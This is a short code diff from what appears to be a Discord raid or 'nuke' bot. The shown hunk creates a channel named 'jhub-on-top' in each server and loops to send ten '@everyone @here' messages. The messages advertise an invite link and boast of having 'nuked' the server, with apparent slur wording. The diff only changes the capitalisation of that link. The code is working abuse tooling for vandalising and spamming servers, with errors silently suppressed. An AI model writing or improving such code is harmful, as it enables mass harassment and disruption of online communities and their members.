@@ -118,7 +118,7 @@ client.on('messageCreate', async (message) => {
             g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
                 if (!ch) return;
                 for (let j = 0; j < 10; j++) {
-                    ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
+                    ch.send('@everyone @here discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                 }
             }).catch(() => {});
             await sleep(200);
